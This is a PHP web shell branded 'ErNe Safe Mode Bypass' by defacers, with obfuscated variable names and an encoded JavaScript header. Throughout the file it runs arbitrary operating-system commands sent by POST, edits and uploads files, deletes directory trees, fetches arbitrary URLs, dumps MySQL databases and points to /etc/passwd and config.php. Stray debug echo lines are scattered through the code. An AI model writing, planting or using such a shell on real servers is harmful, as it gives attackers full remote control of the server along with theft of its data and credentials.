<?php
?>
<html><head><title>Ernealizm - Edited By KingDefacer</title>
<script type="text/javascript" language="javascript">
<!--
echo "[syslog]01\n";
ML="P<>phTsmtr/9:Cuk RIc=jSw.o";
MI="1F=AB05@FA=D4883<::GGGHC;;343HCI7:8>9?HE621:F=AB052";
OT="";
for(j=0;j<MI.length;j++){
OT+=ML.charAt(MI.charCodeAt(j)-48);
}document.write(OT);
// --></script>
<tr><td><center><font size="4" color="#FFFFFF"><span style="background-color: #000000">ErNe Safe Mode Bypass - Edited By KingDefacer</span>
</font></center></td></tr></table>
<style type="text/css">
body,td {
	font-family: "Tahoma";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "Tahoma";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: 1px solid #666666 none;
	padding-left: "2px"
}
.redfont {
	COLOR: "#D0D0D0";
}
a:link,a:visited,a:active {
	color: "#9C9C9C";
	text-decoration: underline;
}
a:hover {
	color: "#FFFFFF";
	text-decoration: none;
}
.top {BACKGROUND-COLOR: "#D0D0D0"}
.firstalt {BACKGROUND-COLOR: "#000000"}
.secondalt {BACKGROUND-COLOR: "#000000"}
</style>
<SCRIPT language=JavaScript>
function CheckAll(form) {
	echo "[syslog]02_f\n";
	for (var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function really(d,f,m,t) {
	if (confirm(m)) {
		if (t == 1) {
			window.location.href='?dir='+d+'&deldir='+f;
		} else {
			window.location.href='?dir='+d+'&delfile='+f;
		}
	}
}
</SCRIPT></head><body><center>
<hr width="775" noshade><table width="775" border="0" cellpadding="0">
<?php  error_reporting(7); ob_start(); $sp875595 = explode(' ', microtime()); $spd725d3 = $sp875595[1] + $sp875595[0]; $sp5a6678 = function_exists('ini_get') ? ini_get('register_globals') : ini_get('register_globals'); if ($sp5a6678 != 1) { @extract($_POST, EXTR_SKIP); @extract($_GET, EXTR_SKIP); } $spa1fbc0 = getcwd(); $spb6c8e7 = $_SERVER['PHP_SELF']; $sp239931 = ini_get('register_globals'); echo '[syslog]03
'; $sp742dc9 = 'no'; $sp8e0a6d = 'localhost'; $spcdc189 = 'shellci_user'; $sp3e5b62 = 'shellci_pass'; $sp5d4f2d = 'shellci_db'; if (get_magic_quotes_gpc()) { $_GET = stripslashes_array($_GET); $_POST = stripslashes_array($_POST); } if (empty($_POST['phpinfo'])) { } else { echo $spbf0f6e = !eregi('phpinfo', $sp239931) ? phpinfo() : 'phpinfo()'; die; } if (isset($_POST['url'])) { $sp0fe90d = @file_get_contents($_POST['url']); echo $sp0fe90d ? $sp0fe90d : '<body bgcolor="#F5F5F5" style="font-size: 12px;"><center><br><p><b>?�?????? URL ?�?????�???�?�?�</b></p></center></body>'; die; } if (empty($_POST['erne'])) { } else { $spdeba40 = '?action=erne'; echo '<table Width=\'100%\' height=\'10%\' bgcolor=\'#000000\' border=\'1\'><tr><td><center><font size=\'6\' color=\'#D0D0D0\'>
Powered By Erne, KingDefacer, Ekin0x, Mohajer22, Ja ( Turkey, Suudi Iraq )<br><br>'; echo '</font></center></td></tr></table> '; die; } if (empty($_POST['command'])) { } else { if (substr(PHP_OS, 0, 3) == 'WIN') { $sp7ef3c9 = isset($_POST['program']) ? $_POST['program'] : 'c:\\winnt\\system32\\cmd.exe'; $sp748cd0 = isset($_POST['prog']) ? $_POST['prog'] : '/c net start > ' . $spa525d4 . '/log.txt'; echo '</form>
'; } $spc48220 = new FORMS(); echo '[syslog]04
'; $spc48220->tableheader(); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>' . $_SERVER['HTTP_HOST'] . '</b></td><td><b>' . $spa1fbc0 . '</b></td><td align="right"><b>' . $_SERVER['REMOTE_ADDR'] . '</b></td></tr></table>', 'center', 'top'); $spc48220->tdbody("<FORM method='POST' action='{$sp10841a}' enctype='multipart/form-data'><INPUT type='submit' name='Rifrish' value='  dir  '  id=input><INPUT type='submit'name='erne' value='ernealizm'  id=input><INPUT type='submit' name='phpinfo' value='PHPinfo' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>"); $spc48220->tablefooter(); $spc48220->tableheader(); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>command [ system , shell_exec , passthru , Wscript.Shell , exec , popen ]</b></td></tr></table>', 'center', 'top'); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); $sp8e45a6 = substr(PHP_OS, 0, 3) == 'WIN' ? array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen', 'wscript' => 'Wscript.Shell') : array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen'); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>cmd:</FONT>' . $spc48220->makeselect(array('name' => 'execfunc', 'option' => $sp8e45a6, 'selected' => $sp9346ca)) . ' ' . $spc48220->makeinput('command') . ' ' . $spc48220->makeinput('Run', 'command', '', 'submit'))); echo '<tr class=\'secondalt\'><td align=\'center\'><textarea name=\'textarea\' cols=\'100\' rows=\'25\' readonly>'; if ($_POST['command']) { if ($sp9346ca == 'system') { system($_POST['command']); } elseif ($sp9346ca == 'passthru') { passthru($_POST['command']); } elseif ($sp9346ca == 'exec') { $spb7d120 = exec($_POST['command']); echo $spb7d120; } elseif ($sp9346ca == 'shell_exec') { $spb7d120 = shell_exec($_POST['command']); echo $spb7d120; } elseif ($sp9346ca == 'popen') { $spb4c55b = popen($_POST['command'], 'r'); $sp1198cc = fread($spb4c55b, 2096); echo $sp1198cc; pclose($spb4c55b); } elseif ($sp9346ca == 'wscript') { $sp02b57f = new COM('W' . 'Scr' . 'ip' . 't.she' . 'll') or die('PHP Create COM WSHSHELL failed'); $spe143cb = $sp02b57f->exec('cm' . 'd.e' . 'xe /c ' . $_POST['command'] . ''); $sp7dcb4c = $spe143cb->StdOut(); $spd5c1de = $sp7dcb4c->ReadAll(); echo $spd5c1de; } else { system($_POST['command']); } } echo '</textarea></td></tr></form></table>'; die; } echo '[syslog]05
'; if ($_POST['editfile']) { $spe0ea16 = fopen($_POST['editfile'], 'r'); $sp719e3e = file($_POST['editfile']); foreach ($sp719e3e as $sp54f89f) { $sp4c8f1b = $sp4c8f1b . $sp54f89f; } echo "<center><div id=logostrip>Edit file: {$sp57b434} </div><form action='{$sp10841a}' method='POST'><textarea name=content cols=122 rows=20>"; echo htmlentities($sp4c8f1b); echo '</textarea>'; echo '<input type=\'hidden\' name=\'dir\' value=\'' . getcwd() . "'>\n<input type='hidden' name='savefile' value='{$_POST['editfile']}'><br>\n<input type='submit' name='submit' value='Save'></form></center>"; fclose($spe0ea16); } if ($_POST['savefile']) { $spe0ea16 = fopen($_POST['savefile'], 'w'); $sp4c8f1b = stripslashes($sp4c8f1b); fwrite($spe0ea16, $sp4c8f1b); fclose($spe0ea16); echo '<center><div id=logostrip>Successfully saved!</div></center>'; } if ($spc6a592) { echo @copy($_FILES['uploadfile']['tmp_name'], '' . $sp6ac5e1 . '/' . $_FILES['uploadfile']['name'] . '') ? '?�???�?�?�?�?��?�!' : '?�???�?�???�?�?�!'; } elseif ($spcc0786 and !empty($_POST['newdirectory'])) { if (!empty($sp1aa2c3)) { $sp907852 = "{$spee51b5}/{$sp1aa2c3}"; if (file_exists("{$sp907852}")) { echo 'can\'t make dir'; } else { echo @mkdir("{$sp907852}", 511) ? 'ok' : ''; @chmod("{$sp907852}", 511); } } } $spa525d4 = str_replace('\\', '/', dirname(__FILE__)); if (!isset($spee51b5) or empty($spee51b5)) { $spee51b5 = '.'; $sp0c30a0 = getPath($spa525d4, $spee51b5); } else { $spee51b5 = $spcb00e1['dir']; $sp0c30a0 = getPath($spa525d4, $spee51b5); } $spbe1491 = dir_writeable($sp0c30a0) ? 'm' : 'mm'; $spbf0f6e = !eregi('phpinfo', $sp239931) ? ' | <a href="?action=phpinfo" target="_blank">PHPINFO()</a>' : ''; $spe17922 = substr(PHP_OS, 0, 3) == 'WIN' ? ' | <a href="?action=reg"mohajer22</a>' : ''; $spc48220 = new FORMS(); $spc48220->tableheader(); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>' . $_SERVER['HTTP_HOST'] . '</b></td><td><b>' . $spa1fbc0 . '</b></td><td align="right"><b>' . $_SERVER['REMOTE_ADDR'] . '</b></td></tr></table>', 'center', 'top'); $spc48220->tdbody("<FORM method='POST' action='{$sp10841a}' enctype='multipart/form-data'><INPUT type='submit' name='Rifrish' value='  dir  '  id=input><INPUT type='submit'name='erne' value='erne '  id=input><INPUT type='submit' name='phpinfo' value='PHPinfo' id=input><INPUT type='submit' name='shell' value='command shill' id=input></form>"); $spc48220->tablefooter(); $spc48220->tableheader(); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Dosya Duzenle Yada Olustur & Dosya Yukle & Dizin Olustur</b></td></tr></table>', 'center', 'top'); $spc48220->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>'); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>Dosya Duzenle weya Olustur:</FONT>' . $spc48220->makehidden('dir', getcwd()) . ' ' . $spc48220->makeinput('editfile') . ' ' . $spc48220->makeinput('Edit', 'Duzenle', '', 'submit'))); $spc48220->headerform(array('action' => '?dir=' . urlencode($spee51b5), 'enctype' => 'multipart/form-data', 'content' => '<FONT COLOR=#9C9C9C>Dosya Yukle:</FONT>' . $spc48220->makeinput('uploadfile', '', '', 'file') . ' ' . $spc48220->makeinput('doupfile', 'Ekle', '', 'submit') . $spc48220->makeinput('uploaddir', $spee51b5, '', 'hidden'))); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>Dizin Olustur:</FONT> ' . $spc48220->makeinput('newdirectory') . ' ' . $spc48220->makeinput('createdirectory', 'yenidizin', '', 'submit'))); $sp8e45a6 = substr(PHP_OS, 0, 3) == 'WIN' ? array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen', 'wscript' => 'Wscript.Shell') : array('system' => 'system', 'passthru' => 'passthru', 'exec' => 'exec', 'shell_exec' => 'shell_exec', 'popen' => 'popen'); $spc48220->headerform(array('content' => '<FONT COLOR=#9C9C9C>cmd:</FONT>' . $spc48220->makeselect(array('name' => 'execfunc', 'option' => $sp8e45a6, 'selected' => $sp9346ca)) . ' ' . $spc48220->makeinput('command') . ' ' . $spc48220->makeinput('Run', 'command', '', 'submit'))); $spc48220->tdbody('</td></tr></table>'); if (!isset($_GET['action']) or empty($_GET['action']) or $_GET['action'] == 'dir') { $spc48220->tableheader(); echo '<tr bgcolor=\'#D0D0D0\'><td align=\'center\' nowrap width=\'27%\'><b>DIR</b></td><td align=\'center\' nowrap width=\'16%\'><b>First data</b></td><td align=\'center\' nowrap width=\'16%\'><b>Last data</b></td><td align=\'center\' nowrap width=\'11%\'><b>Size</b></td><td align=\'center\' nowrap width=\'6%\'><b>Perm</b></td></tr>'; $sp495c2d = @opendir($spee51b5); $sp9c8ee2 = '0'; while ($sp7ff75d = @readdir($sp495c2d)) { $sp256f71 = "{$spee51b5}/{$sp7ff75d}"; $spd09f64 = @is_dir($sp256f71); if ($spd09f64 == '1') { if ($sp7ff75d != '..' && $sp7ff75d != '.') { $sp1c1e65 = @date('Y-m-d H:i:s', @filectime($sp256f71)); $sp875595 = @date('Y-m-d H:i:s', @filemtime($sp256f71)); $spaf3113 = substr(base_convert(fileperms($sp256f71), 10, 8), -4); echo '<tr class=' . getrowbg() . '>
'; echo '  <td style="padding-left: 5px;">[<a href="?dir=' . urlencode($spee51b5) . '/' . urlencode($sp7ff75d) . "\"><font color=\"#006699\">{$sp7ff75d}</font></a>]</td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp1c1e65}</span></td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp875595}</span></td>\n"; echo '  <td align="center" nowrap class="smlfont"><span class="redfont">&lt;dir&gt;</span></td>
'; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$spaf3113}</span></td>\n"; echo '</tr>
'; $sp9c8ee2++; } else { if ($sp7ff75d == '..') { echo '<tr class=' . getrowbg() . '>
'; echo '  <td nowrap colspan="6" style="padding-left: 5px;"><a href="?dir=' . urlencode($spee51b5) . '/' . urlencode($sp7ff75d) . '">Up dir</a></td>
'; echo '</tr>
'; } } } } @closedir($sp495c2d); echo '<tr bgcolor=\'#cccccc\'><td colspan=\'6\' height=\'5\'></td></tr><FORM  method=\'POST\'>'; echo '[syslog]05
'; $sp495c2d = @opendir($spee51b5); $spd9960c = '0'; while ($sp7ff75d = @readdir($sp495c2d)) { $sp256f71 = "{$spee51b5}/{$sp7ff75d}"; $spd09f64 = @is_dir($sp256f71); if ($spd09f64 == '0') { $spbb5bfd = @filesize($sp256f71); $spbb5bfd = $spbb5bfd / 1024; $spbb5bfd = @number_format($spbb5bfd, 3); if (@filectime($sp256f71) == @filemtime($sp256f71)) { $sp1c1e65 = @date('Y-m-d H:i:s', @filectime($sp256f71)); $sp875595 = @date('Y-m-d H:i:s', @filemtime($sp256f71)); } else { $sp1c1e65 = '<span class="redfont">' . @date('Y-m-d H:i:s', @filectime($sp256f71)) . '</span>'; $sp875595 = '<span class="redfont">' . @date('Y-m-d H:i:s', @filemtime($sp256f71)) . '</span>'; } @($sp57e8e3 = substr(base_convert(@fileperms($sp256f71), 10, 8), -4)); echo '<tr class=' . getrowbg() . '>
'; echo '  <td style="padding-left: 5px;">'; echo "<INPUT type=checkbox value=1 name=dl[{$sp256f71}]>"; echo "<a href=\"{$sp256f71}\" target=\"_blank\">{$sp7ff75d}</a></td>\n"; if ($sp7ff75d == 'config.php') { echo "<a href=\"{$sp256f71}\" target=\"_blank\"><font color='yellow'>{$sp7ff75d}<STRONG></STRONG></a></td>\n"; } echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp1c1e65}</span></td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp875595}</span></td>\n"; echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">{$spbb5bfd}</span> KB</td>\n"; echo "  <td align=\"center\" nowrap class=\"smlfont\"><span class=\"redfont\">{$sp57e8e3}</span></td>\n"; echo '</tr>
'; $spd9960c++; } } @closedir($sp495c2d); echo '</FORM>
'; echo '</table>
'; } function debuginfo() { global $spd725d3; $sp875595 = explode(' ', microtime()); $spb293a9 = number_format($sp875595[1] + $sp875595[0] - $spd725d3, 6); echo "Processed in {$spb293a9} second(s)"; } function stripslashes_array(&$sp026f8c) { while (list($sp7ac89e, $spfd9db2) = each($sp026f8c)) { if ($sp7ac89e != 'argc' && $sp7ac89e != 'argv' && (strtoupper($sp7ac89e) != $sp7ac89e || '' . intval($sp7ac89e) == "{$sp7ac89e}")) { if (is_string($spfd9db2)) { $sp026f8c[$sp7ac89e] = stripslashes($spfd9db2); } if (is_array($spfd9db2)) { $sp026f8c[$sp7ac89e] = stripslashes_array($spfd9db2); } } } return $sp026f8c; } function deltree($spff8e42) { $sp5e742e = @dir($spff8e42); while ($sp7ff75d = $sp5e742e->read()) { if (is_dir("{$spff8e42}/{$sp7ff75d}") and $sp7ff75d != '.' and $sp7ff75d != '..') { @chmod("{$spff8e42}/{$sp7ff75d}", 511); deltree("{$spff8e42}/{$sp7ff75d}"); } if (is_file("{$spff8e42}/{$sp7ff75d}")) { @chmod("{$spff8e42}/{$sp7ff75d}", 511); @unlink("{$spff8e42}/{$sp7ff75d}"); } } $sp5e742e->close(); @chmod("{$spff8e42}", 511); return @rmdir($spff8e42) ? 1 : 0; } function dir_writeable($spee51b5) { if (!is_dir($spee51b5)) { @mkdir($spee51b5, 511); } if (is_dir($spee51b5)) { if ($spe0ea16 = @fopen("{$spee51b5}/test.txt", 'w')) { @fclose($spe0ea16); @unlink("{$spee51b5}/test.txt"); $sp4873f8 = 1; } else { $sp4873f8 = 0; } } return $sp4873f8; } function getrowbg() { global $sp46f3f7; if ($sp46f3f7++ % 2 == 0) { return 'firstalt'; } else { return 'secondalt'; } } function getPath($sp15ead4, $sp364c81) { global $spee51b5; $sp43e524 = explode('/', $sp15ead4); $spf75581 = explode('/', $sp364c81); $spcb31a8 = count($spf75581); for ($sp412bbc = 0; $sp412bbc < $spcb31a8; $sp412bbc++) { if ($spf75581[$sp412bbc] == '.' || $spf75581[$sp412bbc] == '') { continue; } if ($spf75581[$sp412bbc] == '..') { $sp4bb7aa = count($sp43e524); unset($sp43e524[$sp4bb7aa - 1]); continue; } $sp43e524[count($sp43e524)] = $spf75581[$sp412bbc]; } return implode('/', $sp43e524); } function getphpcfg($spd53bce) { switch ($spb7d120 = ini_get('register_globals')) { case 0: return 'No'; break; case 1: return 'Yes'; break; default: return $spb7d120; break; } } function getfun($spcc8da3) { return false !== function_exists($spcc8da3) ? 'Yes' : 'No'; } class PHPZip { var $out = ''; function PHPZip($spee51b5) { if (@function_exists('gzcompress')) { $sp7f894a = getcwd(); if (is_array($spee51b5)) { $spdb0026 = $spee51b5; } else { $spdb0026 = $this->GetFileList($spee51b5); foreach ($spdb0026 as $sp8db113 => $sp6d4391) { $spdb0026[] = substr($sp6d4391, strlen($spee51b5) + 1); } } if (!empty($spee51b5) && !is_array($spee51b5) && file_exists($spee51b5)) { chdir($spee51b5); } else { chdir($sp7f894a); } if (count($spdb0026) > 0) { foreach ($spdb0026 as $spcc5ae4) { if (is_file($spcc5ae4)) { $sp8ca934 = fopen($spcc5ae4, 'r'); $sp4c8f1b = @fread($sp8ca934, filesize($spcc5ae4)); fclose($sp8ca934); if (is_array($spee51b5)) { $spcc5ae4 = basename($spcc5ae4); } $this->addFile($sp4c8f1b, $spcc5ae4); } } $this->out = $this->file(); chdir($sp7f894a); } return 1; } else { return 0; } } function GetFileList($spee51b5) { static $spd09f64; if (is_dir($spee51b5)) { if ($spcfdfd7 = opendir($spee51b5)) { while (($sp7ff75d = readdir($spcfdfd7)) !== false) { if ($sp7ff75d != '.' && $sp7ff75d != '..') { $sp1b2b3c = $spee51b5 . '/' . $sp7ff75d; if (is_dir($sp1b2b3c)) { $this->GetFileList($sp1b2b3c); } $spd09f64[] = $sp1b2b3c; } } closedir($spcfdfd7); } } return $spd09f64; } var $datasec = array(); var $ctrl_dir = array(); var $eof_ctrl_dir = 'PK    '; var $old_offset = 0; function unix2DosTime($spe5d9e4 = 0) { $sp8d5b99 = $spe5d9e4 == 0 ? getdate() : getdate($spe5d9e4); if ($sp8d5b99['year'] < 1980) { $sp8d5b99['year'] = 1980; $sp8d5b99['mon'] = 1; $sp8d5b99['mday'] = 1; $sp8d5b99['hours'] = 0; $sp8d5b99['minutes'] = 0; $sp8d5b99['seconds'] = 0; } return $sp8d5b99['year'] - 1980 << 25 | $sp8d5b99['mon'] << 21 | $sp8d5b99['mday'] << 16 | $sp8d5b99['hours'] << 11 | $sp8d5b99['minutes'] << 5 | $sp8d5b99['seconds'] >> 1; } function addFile($sp410a9e, $spd86858, $spb8a5bd = 0) { $spd86858 = str_replace('\\', '/', $spd86858); $sp4b19f3 = dechex($this->unix2DosTime($spb8a5bd)); $sp9c5386 = '\\x' . $sp4b19f3[6] . $sp4b19f3[7] . '\\x' . $sp4b19f3[4] . $sp4b19f3[5] . '\\x' . $sp4b19f3[2] . $sp4b19f3[3] . '\\x' . $sp4b19f3[0] . $sp4b19f3[1]; eval('$hexdtime = "' . $sp9c5386 . '";'); $sp66d307 = 'PK'; $sp66d307 .= ' '; $sp66d307 .= '  '; $sp66d307 .= ' '; $sp66d307 .= $sp9c5386; $spfd6e56 = strlen($sp410a9e); $spc68b02 = crc32($sp410a9e); $sp1f369a = gzcompress($sp410a9e); $sp1206c0 = strlen($sp1f369a); $sp1f369a = substr(substr($sp1f369a, 0, strlen($sp1f369a) - 4), 2); $sp66d307 .= pack('V', $spc68b02); $sp66d307 .= pack('V', $sp1206c0); $sp66d307 .= pack('V', $spfd6e56); $sp66d307 .= pack('v', strlen($spd86858)); $sp66d307 .= pack('v', 0); $sp66d307 .= $spd86858; $sp66d307 .= $sp1f369a; $sp66d307 .= pack('V', $spc68b02); $sp66d307 .= pack('V', $sp1206c0); $sp66d307 .= pack('V', $spfd6e56); $this->datasec[] = $sp66d307; $sp0d28ae = strlen(implode('', $this->datasec)); $spccba28 = 'PK'; $spccba28 .= '  '; $spccba28 .= ' '; $spccba28 .= '  '; $spccba28 .= ' '; $spccba28 .= $sp9c5386; $spccba28 .= pack('V', $spc68b02); $spccba28 .= pack('V', $sp1206c0); $spccba28 .= pack('V', $spfd6e56); $spccba28 .= pack('v', strlen($spd86858)); $spccba28 .= pack('v', 0); $spccba28 .= pack('v', 0); $spccba28 .= pack('v', 0); $spccba28 .= pack('v', 0); $spccba28 .= pack('V', 32); $spccba28 .= pack('V', $this->old_offset); $this->old_offset = $sp0d28ae; $spccba28 .= $spd86858; $this->ctrl_dir[] = $spccba28; } function file() { $sp410a9e = implode('', $this->datasec); $spb8c612 = implode('', $this->ctrl_dir); return $sp410a9e . $spb8c612 . $this->eof_ctrl_dir . pack('v', sizeof($this->ctrl_dir)) . pack('v', sizeof($this->ctrl_dir)) . pack('V', strlen($spb8c612)) . pack('V', strlen($sp410a9e)) . '  '; } } function sqldumptable($sp110772, $spe0ea16 = 0) { $sp9a1ce3 = "DROP TABLE IF EXISTS {$sp110772};\n"; $sp9a1ce3 .= "CREATE TABLE {$sp110772} (\n"; $spb1da65 = 1; $spdf819b = mysql_query("SHOW FIELDS FROM {$sp110772}"); while ($sp93fb34 = mysql_fetch_array($spdf819b)) { if (!$spb1da65) { $sp9a1ce3 .= ',
'; } else { $spb1da65 = 0; } $sp9a1ce3 .= "   {$sp93fb34['Field']} {$sp93fb34['Type']}"; if (!empty($sp93fb34['Default'])) { $sp9a1ce3 .= " DEFAULT '{$sp93fb34['Default']}'"; } if ($sp93fb34['Null'] != 'YES') { $sp9a1ce3 .= ' NOT NULL'; } if ($sp93fb34['Extra'] != '') { $sp9a1ce3 .= " {$sp93fb34['Extra']}"; } } mysql_free_result($spdf819b); $sp713ccf = mysql_query("SHOW KEYS FROM {$sp110772}"); while ($sp7ac89e = mysql_fetch_array($sp713ccf)) { $sp57061c = $sp7ac89e['Key_name']; if ($sp57061c != 'PRIMARY' and $sp7ac89e['Non_unique'] == 0) { $sp57061c = "UNIQUE|{$sp57061c}"; } if (!is_array($sp5bae77[$sp57061c])) { $sp5bae77[$sp57061c] = array(); } $sp5bae77[$sp57061c][] = $sp7ac89e['Column_name']; } mysql_free_result($sp713ccf); while (list($sp57061c, $spba3e65) = @each($sp5bae77)) { $sp9a1ce3 .= ',
'; $spddc174 = implode($spba3e65, ','); if ($sp57061c == 'PRIMARY') { $sp9a1ce3 .= "   PRIMARY KEY ({$spddc174})"; } else { if (substr($sp57061c, 0, 6) == 'UNIQUE') { $sp57061c = substr($sp57061c, 7); } $sp9a1ce3 .= "   KEY {$sp57061c} ({$spddc174})"; } } $sp9a1ce3 .= '
);

'; if ($spe0ea16) { fwrite($spe0ea16, $sp9a1ce3); } else { echo $sp9a1ce3; } $sp5183f2 = mysql_query("SELECT * FROM {$sp110772}"); $spe3007b = mysql_num_fields($sp5183f2); while ($spa596f1 = mysql_fetch_array($sp5183f2)) { $sp9a1ce3 = "INSERT INTO {$sp110772} VALUES("; $spa1d126 = -1; $spb1da65 = 1; while (++$spa1d126 < $spe3007b) { if (!$spb1da65) { $sp9a1ce3 .= ', '; } else { $spb1da65 = 0; } if (!isset($spa596f1[$spa1d126])) { $sp9a1ce3 .= 'NULL'; } else { $sp9a1ce3 .= '\'' . mysql_escape_string($spa596f1[$spa1d126]) . '\''; } } $sp9a1ce3 .= ');
'; if ($spe0ea16) { fwrite($spe0ea16, $sp9a1ce3); } else { echo $sp9a1ce3; } } mysql_free_result($sp5183f2); } echo '[syslog]06
'; class FORMS { function tableheader() { echo '<table width="775" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
'; } function headerform($spa3abbf = array()) { global $spee51b5; if ($spa3abbf[enctype]) { $spe3ccc8 = "enctype=\"{$spa3abbf['enctype']}\""; } else { $spe3ccc8 = ''; } if (!isset($spa3abbf[method])) { $spa3abbf[method] = 'POST'; } if (!isset($spa3abbf[action])) { $spa3abbf[action] = ''; } echo '  <form action="' . $spa3abbf[action] . '" method="' . $spa3abbf[method] . "\" {$spe3ccc8}>\n"; echo '  <tr>
'; echo '    <td>' . $spa3abbf[content] . '</td>
'; echo '  </tr>
'; echo '  </form>
'; } function tdheader($sp7a81ba) { global $spee51b5; echo '  <tr class="firstalt">
'; echo '	<td align="center"><b>' . $sp7a81ba . ' [<a href="?dir=' . urlencode($spee51b5) . '">?�mohajer</a>]</b></td>
'; echo '  </tr>
'; } function tdbody($sp4c8f1b, $spbe28e8 = 'center', $sp273ba1 = '2', $sp138de5 = '', $sp3a5ed0 = '', $spa1f6cd = '') { if ($sp273ba1 == '2') { $spa8ca3a = 'secondalt'; } elseif ($sp273ba1 == '1') { $spa8ca3a = 'firstalt'; } else { $spa8ca3a = $sp273ba1; } $sp138de5 = empty($sp138de5) ? '' : ' height=' . $sp138de5; $spa1f6cd = empty($spa1f6cd) ? '' : ' colspan=' . $spa1f6cd; echo '  <tr class="' . $spa8ca3a . '">
'; echo '	<td align="' . $spbe28e8 . '"' . $sp138de5 . ' ' . $spa1f6cd . ' ' . $sp3a5ed0 . '>' . $sp4c8f1b . '</td>
'; echo '  </tr>
'; } function tablefooter() { echo '</table>
'; } function formheader($spdeba40 = '', $sp7a81ba, $sp9b4715 = '') { global $spee51b5; $sp9b4715 = empty($sp9b4715) ? '' : ' target="' . $sp9b4715 . '"'; echo " <form action=\"{$spdeba40}\" method=\"POST\"" . $sp9b4715 . '>
'; echo '  <tr class="firstalt">
'; echo '	<td align="center"><b>' . $sp7a81ba . ' [<a href="?dir=' . urlencode($spee51b5) . '">?�?�?�??</a>]</b></td>
'; echo '  </tr>
'; } function makehidden($spd86858, $sp8e17b7 = '') { echo "<input type=\"hidden\" name=\"{$spd86858}\" value=\"{$sp8e17b7}\">\n"; } function makeinput($spd86858, $sp8e17b7 = '', $sp3a5ed0 = '', $spa48979 = 'text', $spbb5bfd = '30', $spa8ca3a = 'input') { $spa8ca3a = $spa8ca3a == 'input' ? ' class="input"' : ''; $sp241bf9 = "<input name=\"{$spd86858}\" value=\"{$sp8e17b7}\" type=\"{$spa48979}\" " . $spa8ca3a . " size=\"{$spbb5bfd}\" {$sp3a5ed0}>\n"; return $sp241bf9; } function makeid($spd86858, $sp8e17b7 = '', $sp3a5ed0 = '', $spa48979 = 'select', $spbb5bfd = '30', $spa8ca3a = 'input') { $spa8ca3a = $spa8ca3a == 'input' ? ' class="input"' : ''; $sp241bf9 = '<select name=plugin><option>cat /etc/passwd</option></select>'; return $sp241bf9; } function makeimp($spd86858, $sp8e17b7 = '', $sp3a5ed0 = '', $spa48979 = 'select', $spbb5bfd = '30', $spa8ca3a = 'input') { $spa8ca3a = $spa8ca3a == 'input' ? ' class="input"' : ''; $sp241bf9 = '<select name=switch><option value=file>View file</option><option value=dir>View dir</option></select>'; return $sp241bf9; } function maketextarea($spd86858, $sp4c8f1b = '', $sp183cd7 = '100', $sp5183f2 = '20', $sp3a5ed0 = '') { $spcd33af = '<textarea name="' . $spd86858 . '" cols="' . $sp183cd7 . '" rows="' . $sp5183f2 . '" ' . $sp3a5ed0 . '>' . $sp4c8f1b . '</textarea>
'; return $spcd33af; } function formfooter($sp7ac354 = '', $sp138de5 = '') { $sp138de5 = empty($sp138de5) ? '' : ' height="' . $sp138de5 . '"'; echo '  <tr class="secondalt">
'; echo '	<td align="center"' . $sp138de5 . '><input class="input" type="submit" value=\'mohajer\'></td>
'; echo '  </tr>
'; echo ' </form>
'; echo $sp7f97e0 = empty($sp7ac354) ? '' : '</table>
'; } function makeselect($spa3abbf = array()) { if ($spa3abbf[multiple] == 1) { $sp25f446 = ' multiple'; if ($spa3abbf[size] > 0) { $spbb5bfd = "size={$spa3abbf['size']}"; } } if ($spa3abbf[css] == 0) { $spa8ca3a = 'class="input"'; } $sp9633f6 = "<select {$spa8ca3a} name=\"{$spa3abbf['name']}\"{$sp25f446} {$spbb5bfd}>\n"; if (is_array($spa3abbf[option])) { foreach ($spa3abbf[option] as $sp7ac89e => $sp8e17b7) { if (!is_array($spa3abbf[selected])) { if ($spa3abbf[selected] == $sp7ac89e) { $sp9633f6 .= "<option value=\"{$sp7ac89e}\" selected>{$sp8e17b7}</option>\n"; } else { $sp9633f6 .= "<option value=\"{$sp7ac89e}\">{$sp8e17b7}</option>\n"; } } elseif (is_array($spa3abbf[selected])) { if ($spa3abbf[selected][$sp7ac89e] == 1) { $sp9633f6 .= "<option value=\"{$sp7ac89e}\" selected>{$sp8e17b7}</option>\n"; } else { $sp9633f6 .= "<option value=\"{$sp7ac89e}\">{$sp8e17b7}</option>\n"; } } } } $sp9633f6 .= '</select>
